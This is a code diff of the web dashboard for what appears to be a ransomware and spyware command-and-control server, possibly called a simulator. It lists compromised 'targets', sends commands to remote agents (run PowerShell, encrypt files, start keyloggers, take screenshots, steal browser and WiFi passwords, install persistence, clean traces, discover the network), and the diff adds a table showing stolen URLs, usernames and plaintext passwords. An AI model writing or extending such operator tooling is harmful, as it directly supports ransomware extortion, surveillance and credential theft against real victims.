@@ -404,20 +404,43 @@
     <script>
         // ============ AUTHENTICATION ============
         const authData = sessionStorage.getItem('ransim_auth');
-        if (!authData) { window.location.href = '/login'; }
-        else {
+        if (!authData) {
+            window.location.href = '/login';
+        } else {
             try {
                 const { time } = JSON.parse(atob(authData));
-                if (Date.now() - time > 3600000) { sessionStorage.removeItem('ransim_auth'); window.location.href = '/login'; }
-            } catch (e) { sessionStorage.removeItem('ransim_auth'); window.location.href = '/login'; }
+                if (Date.now() - time > 3600000) {
+                    sessionStorage.removeItem('ransim_auth');
+                    window.location.href = '/login';
+                }
+            } catch (e) {
+                sessionStorage.removeItem('ransim_auth');
+                window.location.href = '/login';
+            }
         }
-        function logout() { sessionStorage.removeItem('ransim_auth'); window.location.href = '/login'; }
+
+        function logout() {
+            sessionStorage.removeItem('ransim_auth');
+            window.location.href = '/login';
+        }
 
         let currentPage = 'overview';
-        let agentsData = [];
 
-        function escapeHtml(str) { if (!str) return ''; return str.replace(/[&<>]/g, function (m) { if (m === '&') return '&amp;'; if (m === '<') return '&lt;'; if (m === '>') return '&gt;'; return m; }); }
-        function formatDate(ts) { if (!ts || !ts._seconds) return 'N/A'; return new Date(ts._seconds * 1000).toLocaleString(); }
+        function escapeHtml(str) {
+            if (!str) return '';
+            return str.replace(/[&<>]/g, function (m) {
+                if (m === '&') return '&amp;';
+                if (m === '<') return '&lt;';
+                if (m === '>') return '&gt;';
+                return m;
+            });
+        }
+
+        function formatDate(ts) {
+            if (!ts || !ts._seconds) return 'N/A';
+            return new Date(ts._seconds * 1000).toLocaleString();
+        }
+
         function getStatusClass(lastHeartbeat) {
             if (!lastHeartbeat || !lastHeartbeat._seconds) return 'badge-offline';
             const secondsAgo = (Date.now() / 1000) - lastHeartbeat._seconds;
@@ -425,6 +448,7 @@
             if (secondsAgo < 300) return 'badge-idle';
             return 'badge-offline';
         }
+
         function getStatusText(lastHeartbeat) {
             if (!lastHeartbeat || !lastHeartbeat._seconds) return 'OFFLINE';
             const secondsAgo = (Date.now() / 1000) - lastHeartbeat._seconds;
@@ -436,8 +460,8 @@
         async function fetchAgents() {
             const res = await fetch('/api/agents');
             const data = await res.json();
-            if (data.success) agentsData = data.agents;
-            return agentsData;
+            if (data.success) return data.agents;
+            return [];
         }
 
         async function deleteAgent(sessionId) {
@@ -445,9 +469,15 @@
             try {
                 const res = await fetch(`/api/agents/${sessionId}`, { method: 'DELETE' });
                 const data = await res.json();
-                if (data.success) { showToast('Agent deleted', 'success'); refreshCurrentPage(); }
-                else showToast('Delete failed: ' + data.error, 'error');
-            } catch (err) { showToast('Error: ' + err.message, 'error'); }
+                if (data.success) {
+                    showToast('Agent deleted', 'success');
+                    refreshCurrentPage();
+                } else {
+                    showToast('Delete failed: ' + data.error, 'error');
+                }
+            } catch (err) {
+                showToast('Error: ' + err.message, 'error');
+            }
         }
 
         async function decryptAgent(sessionId) {
@@ -460,9 +490,14 @@
                     body: JSON.stringify({ session_id: sessionId, private_key: privateKey })
                 });
                 const data = await res.json();
-                if (data.success) showToast('Decrypt command sent! Agent will restore files.', 'success');
-                else showToast('Decrypt failed: ' + data.error, 'error');
-            } catch (err) { showToast('Error: ' + err.message, 'error'); }
+                if (data.success) {
+                    showToast('Decrypt command sent! Agent will restore files.', 'success');
+                } else {
+                    showToast('Decrypt failed: ' + data.error, 'error');
+                }
+            } catch (err) {
+                showToast('Error: ' + err.message, 'error');
+            }
         }
 
         async function fetchExfilData(typeFilter = null) {
@@ -474,21 +509,42 @@
             return [];
         }
 
-        async function renderOverview() {
-            // Save state before fetching and rebuilding UI
-            const prevSession = document.getElementById('cmdSession')?.value;
-            const prevCmdType = document.getElementById('cmdType')?.value;
-            const prevScript = document.getElementById('execScript')?.value;
+        async function sendCommand(targetSession, commandType, parameters = {}) {
+            try {
+                const res = await fetch('/api/send_command', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        target_session: targetSession,
+                        command_type: commandType,
+                        parameters: parameters,
+                        scheduled_time: new Date().toISOString()
+                    })
+                });
+                const data = await res.json();
+                if (data.success) {
+                    showToast(`Command ${commandType} sent to ${targetSession.substring(0, 8)}...`, 'success');
+                } else {
+                    showToast(`Failed: ${data.error}`, 'error');
+                }
+            } catch (err) {
+                showToast('Error: ' + err.message, 'error');
+            }
+        }
 
+        // ============ PAGE RENDERERS ============
+        async function renderOverview() {
             const agents = await fetchAgents();
             const exfilAll = await fetchExfilData();
+
             const totalAgents = agents.length;
             const activeAgents = agents.filter(a => getStatusClass(a.lastHeartbeat) === 'badge-active').length;
             const screenshots = exfilAll.filter(e => e.type === 'screenshot').length;
             const keylogs = exfilAll.filter(e => e.type === 'keylog' || e.type === 'keylogger').length;
             const wifi = exfilAll.filter(e => e.type === 'wifi').length;
-            const browser = exfilAll.filter(e => e.type === 'browser').length;
-            document.getElementById('pageTitle').innerText = 'Overview Dashboard';
+            const browser = exfilAll.filter(e => e.type === 'browser_passwords').length;
+
+            document.getElementById('pageTitle').innerHTML = 'Overview Dashboard';
             document.getElementById('pageContent').innerHTML = `
                 <div class="stats">
                     <div class="stat-card"><h3>${totalAgents}</h3><p>Total Targets</p></div>
@@ -499,11 +555,12 @@
                     <div class="stat-card"><h3>${screenshots}</h3><p>Screenshots</p></div>
                 </div>
                 <div class="panel">
-                    <div class="panel-header">Active Sessions (with real status)</div>
+                    <div class="panel-header">Active Sessions</div>
                     <div class="panel-body-scroll">
-                        <table><thead><tr><th>Session ID</th><th>Hostname/User</th><th>IP Address</th><th>Last Heartbeat</th><th>Status</th><th>Actions</th></tr></thead>
-                        <tbody id="overviewAgentsBody"></tbody>
-                    </table>
+                        <table>
+                            <thead><tr><th>Session ID</th><th>Hostname/User</th><th>IP Address</th><th>Last Heartbeat</th><th>Status</th><th>Actions</th></tr></thead>
+                            <tbody id="overviewAgentsBody"></tbody>
+                        </table>
                     </div>
                 </div>
                 <div class="panel">
@@ -513,56 +570,43 @@
                             <div><label>Target Session</label><select id="cmdSession"></select></div>
                             <div><label>Command Type</label><select id="cmdType">
                                 <option value="exec">exec - Execute PowerShell Command</option>
-                                <option value="encrypt">ransomware - Ransomware Attack</option>
-                                <option value="keylog_start">keylogger - Start Keylogger</option>
-                                <option value="keylog_stop">stop_keylogger - Stop Keylogger</option>
+                                <option value="encrypt">encrypt - Ransomware Attack</option>
+                                <option value="keylog_start">keylog_start - Start Keylogger</option>
+                                <option value="keylog_stop">keylog_stop - Stop Keylogger</option>
                                 <option value="keylog_get">keylog_get - Download Keylogger File</option>
                                 <option value="screenshot">screenshot - Take Screenshot</option>
-                                <option value="phishing">phishing - Deploy Phishing Page</option>
-                                <option value="spread">spread - USB Spread</option>
-                                <option value="persist">persistence - Install Persistence</option>
-                                <option value="spyware">spyware - Deploy Spyware Monitor</option>
-                                <option value="clean">clean - Clean Traces</option>
-                                <option value="steal_browsers">steal_browser - Steal Browser Data</option>
-                                <option value="wifi_profiles">steal_wifi - Steal WiFi Passwords</option>
+                                <option value="steal_browsers">steal_browsers - Steal Browser Data</option>
+                                <option value="steal_wifi">steal_wifi - Steal WiFi Passwords</option>
                                 <option value="system_info">system_info - Get System Info</option>
+                                <option value="persist">persist - Install Persistence</option>
+                                <option value="clean">clean - Clean Traces</option>
+                                <option value="lateral_discover">lateral_discover - Discover Network</option>
+                                <option value="uninstall">uninstall - Uninstall Agent</option>
                             </select></div>
-                            <div><label>&nbsp;</label><button onclick="sendCommandFromOverview()">🚀 Execute</button></div>
+                            <div><label>&nbsp;</label><button onclick="executeCommandFromOverview()">🚀 Execute</button></div>
                         </div>
-                        <div id="execParamsDiv" style="margin-top:16px; display:none;"><label>PowerShell Script</label><textarea id="execScript" rows="4" placeholder="Enter PowerShell commands..."></textarea></div>
+                        <div id="execParamsDiv" style="margin-top:16px; display:none;">
+                            <label>PowerShell Script</label>
+                            <textarea id="execScript" rows="4" placeholder="Enter PowerShell commands..."></textarea>
+                        </div>
                     </div>
                 </div>
             `;
 
             const tbody = document.getElementById('overviewAgentsBody');
-            if (tbody) {
-                tbody.innerHTML = agents.map(a => `
-                    <tr>
-                        <td><code>${escapeHtml(a.sessionId || a.id)}</code></td>
-                        <td>${escapeHtml(a.hostname || '?')}<br><span style="color:#888">${escapeHtml(a.username || '?')}</span></td>
-                        <td>${escapeHtml(a.ip || '?')}</td>
-                        <td>${formatDate(a.lastHeartbeat)}</td>
-                        <td><span class="${getStatusClass(a.lastHeartbeat)}">${getStatusText(a.lastHeartbeat)}</span></td>
-                        <td><button class="action-btn decrypt-btn" onclick="decryptAgent('${a.sessionId || a.id}')">🔓 Decrypt</button><button class="action-btn delete-btn" onclick="deleteAgent('${a.sessionId || a.id}')">🗑️ Delete</button></td>
-                    </tr>
-                `).join('');
-            }
+            tbody.innerHTML = agents.map(a => `
+                <tr>
+                    <td><code>${escapeHtml(a.sessionId || a.id)}</code></td>
+                    <td>${escapeHtml(a.hostname || '?')}<br><span style="color:#888">${escapeHtml(a.username || '?')}</span></td>
+                    <td>${escapeHtml(a.ip || '?')}</td>
+                    <td>${formatDate(a.lastHeartbeat)}</td>
+                    <td><span class="${getStatusClass(a.lastHeartbeat)}">${getStatusText(a.lastHeartbeat)}</span></td>
+                    <td><button class="action-btn decrypt-btn" onclick="decryptAgent('${a.sessionId || a.id}')">🔓 Decrypt</button><button class="action-btn delete-btn" onclick="deleteAgent('${a.sessionId || a.id}')">🗑️ Delete</button></td>
+                </tr>
+            `).join('');
 
             const sessionSelect = document.getElementById('cmdSession');
             sessionSelect.innerHTML = '<option value="all">ALL ACTIVE AGENTS</option>' + agents.map(a => `<option value="${a.sessionId || a.id}">${(a.sessionId || a.id).substring(0, 8)}... - ${a.hostname}</option>`).join('');
-
-            // Restore state if they existed
-            if (prevSession) {
-                if (sessionSelect) sessionSelect.value = prevSession;
-            }
-            if (prevCmdType) {
-                const cmdTypeSelect = document.getElementById('cmdType');
-                if (cmdTypeSelect) cmdTypeSelect.value = prevCmdType;
-            }
-            if (prevScript) {
-                const scriptArea = document.getElementById('execScript');
-                if (scriptArea) scriptArea.value = prevScript;
-            }
 
             const cmdType = document.getElementById('cmdType');
             const execDiv = document.getElementById('execParamsDiv');
@@ -570,24 +614,16 @@
             execDiv.style.display = cmdType.value === 'exec' ? 'block' : 'none';
         }
 
-        async function sendCommandFromOverview() {
-            const session = document.getElementById('cmdSession').value;
+        async function executeCommandFromOverview() {
+            const target = document.getElementById('cmdSession').value;
             const cmdType = document.getElementById('cmdType').value;
-            const script = document.getElementById('execScript')?.value || '';
             let parameters = {};
-            if (cmdType === 'exec') parameters = { script };
-            else if (cmdType === 'encrypt') parameters = { TargetDirectory: '' };
-
-            try {
-                const res = await fetch('/api/send_command', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ target_session: session, command_type: cmdType, parameters, scheduled_time: new Date().toISOString() })
-                });
-                const data = await res.json();
-                if (data.success) alert('Command sent!');
-                else alert('Error: ' + data.error);
-            } catch (err) { alert('Failed: ' + err.message); }
+            if (cmdType === 'exec') {
+                const script = document.getElementById('execScript').value;
+                if (!script.trim()) { alert('Please enter script'); return; }
+                parameters = { script: script };
+            }
+            await sendCommand(target, cmdType, parameters);
         }
 
         async function renderScreenshots() {
@@ -611,22 +647,26 @@
             const tbody = document.getElementById('keylogsBody');
             if (data.length === 0) tbody.innerHTML = '<tr><td colspan="3" class="text-muted">No keylogs yet.</td></tr>';
             else {
-                tbody.innerHTML = data.map(k => `<tr><td><code>${escapeHtml(k.sessionId?.substring(0, 8))}</code></td><td><pre style="max-height:100px;overflow:auto;">${escapeHtml((k.data || '').substring(0, 500))}</pre></td><td>${formatDate(k.timestamp)}</td></tr>`).join('');
+                tbody.innerHTML = data.map(k => `<tr><td><code>${escapeHtml(k.sessionId?.substring(0, 8))}</code></td><td><pre style="max-height:100px;overflow:auto;">${escapeHtml((k.data?.content || k.data || '').substring(0, 500))}</pre></td><td>${formatDate(k.timestamp)}</td></tr>`).join('');
             }
         }
 
         async function renderBrowser() {
             document.getElementById('pageTitle').innerText = 'Browser Credentials';
-            const data = await fetchExfilData('browser');
-            document.getElementById('pageContent').innerHTML = `<div class="panel"><div class="panel-body-scroll"><table><thead><tr><th>Session</th><th>Browser</th><th>Size</th><th>Time</th></tr></thead><tbody id="browserBody"></tbody></table></div></div>`;
+            const data = await fetchExfilData('browser_passwords');
+            document.getElementById('pageContent').innerHTML = `<div class="panel"><div class="panel-body-scroll"><table><thead><tr><th>Session</th><th>Browser</th><th>URL</th><th>Username</th><th>Password</th></tr></thead><tbody id="browserBody"></tbody></table></div></div>`;
             const tbody = document.getElementById('browserBody');
-            if (data.length === 0) tbody.innerHTML = '<tr><td colspan="4" class="text-muted">No browser data yet.</td></tr>';
+            if (data.length === 0) tbody.innerHTML = '<tr><td colspan="5" class="text-muted">No browser data yet.</td></tr>';
             else {
-                tbody.innerHTML = data.map(b => {
-                    const browserName = b.data?.browser || 'Unknown';
-                    const size = b.data?.size || (b.data?.file?.length || 0);
-                    return `<tr><td><code>${escapeHtml(b.sessionId?.substring(0, 8))}</code></td><td>${escapeHtml(browserName)}</td><td>${size} bytes</td><td>${formatDate(b.timestamp)}</td></tr>`;
-                }).join('');
+                const rows = [];
+                for (const item of data) {
+                    const passwords = item.data?.passwords || [];
+                    for (const cred of passwords) {
+                        rows.push(`<tr><td><code>${escapeHtml(item.sessionId?.substring(0, 8))}</code></td><td>${escapeHtml(cred.Browser)}</td><td>${escapeHtml(cred.URL)}</td><td>${escapeHtml(cred.Username)}</td><td><code>${escapeHtml(cred.Password)}</code></td></tr>`);
+                    }
+                }
+                if (rows.length === 0) tbody.innerHTML = '<tr><td colspan="5">No passwords parsed.</td></tr>';
+                else tbody.innerHTML = rows.join('');
             }
         }
 
@@ -641,10 +681,10 @@
                 for (const wifi of data) {
                     const networks = wifi.data?.networks || [];
                     for (const net of networks) {
-                        rows.push(`<tr><td><code>${escapeHtml(wifi.sessionId?.substring(0, 8))}</code></td><td>${escapeHtml(net.ssid)}</td><td><code>${escapeHtml(net.password)}</code></td><td>${formatDate(wifi.timestamp)}</td></tr>`);
+                        rows.push(`<tr><td><code>${escapeHtml(wifi.sessionId?.substring(0, 8))}</code></td><td>${escapeHtml(net.SSID)}</td><td><code>${escapeHtml(net.Password)}</code></td><td>${formatDate(wifi.timestamp)}</td></tr>`);
                     }
                 }
-                if (rows.length === 0) tbody.innerHTML = '<tr><td colspan="4">No WiFi data parsed. </td></tr>';
+                if (rows.length === 0) tbody.innerHTML = '<tr><td colspan="4">No WiFi data parsed.</td></tr>';
                 else tbody.innerHTML = rows.join('');
             }
         }
@@ -654,15 +694,17 @@
             const data = await fetchExfilData('command_result');
             document.getElementById('pageContent').innerHTML = `<div class="panel"><div class="panel-body-scroll"><table><thead><tr><th>Session</th><th>Command</th><th>Status</th><th>Result</th><th>Time</th></tr></thead><tbody id="commandsHistoryBody"></tbody></table></div></div>`;
             const tbody = document.getElementById('commandsHistoryBody');
-            if (data.length === 0) tbody.innerHTML = '<tr><td colspan="5">No command history. </td></tr>';
+            if (data.length === 0) tbody.innerHTML = '<tr><td colspan="5">No command history.</td></tr>';
             else {
-                tbody.innerHTML = data.slice(0, 100).map(cmd => `<tr>
-                    <td><code>${escapeHtml(cmd.sessionId?.substring(0, 8))}</code></td>
-                    <td><span class="badge-active" style="background:#2a1a4e;">${escapeHtml(cmd.command_type)}</span></td>
-                    <td><span class="badge ${cmd.status === 'completed' ? 'badge-active' : 'badge-offline'}">${escapeHtml(cmd.status || 'unknown')}</span></td>
-                    <td><pre style="max-width:300px; overflow:auto;">${escapeHtml((cmd.result || cmd.error || '')?.substring(0, 200))}</pre></td>
-                    <td>${formatDate(cmd.timestamp)}</td>
-                </tr>`).join('');
+                tbody.innerHTML = data.slice(0, 100).map(cmd => `
+                    <tr>
+                        <td><code>${escapeHtml(cmd.sessionId?.substring(0, 8))}</code></td>
+                        <td><span class="badge-active" style="background:#2a1a4e;">${escapeHtml(cmd.command_type)}</span></td>
+                        <td><span class="badge ${cmd.status === 'completed' ? 'badge-active' : 'badge-offline'}">${escapeHtml(cmd.status || 'unknown')}</span></td>
+                        <td><pre style="max-width:300px; overflow:auto;">${escapeHtml((cmd.result || cmd.error || '').substring(0, 200))}</pre></td>
+                        <td>${formatDate(cmd.timestamp)}</td>
+                    </tr>
+                `).join('');
             }
         }
 
@@ -702,8 +744,15 @@
             setTimeout(() => toast.remove(), 3000);
         }
 
-        function showImageModal(src) { const modal = document.getElementById('imageModal'); document.getElementById('modalImage').src = src; modal.style.display = 'flex'; }
-        function closeModal() { document.getElementById('imageModal').style.display = 'none'; }
+        function showImageModal(src) {
+            const modal = document.getElementById('imageModal');
+            document.getElementById('modalImage').src = src;
+            modal.style.display = 'flex';
+        }
+
+        function closeModal() {
+            document.getElementById('imageModal').style.display = 'none';
+        }
 
         document.querySelectorAll('.nav-item').forEach(item => {
             item.addEventListener('click', async () => {
@@ -714,8 +763,9 @@
                 await refreshCurrentPage();
             });
         });
+
         refreshCurrentPage();
-        setInterval(refreshCurrentPage, 3000); // 3 seconds for near real-time responsiveness
+        setInterval(refreshCurrentPage, 15000);
     </script>
 </body>
 
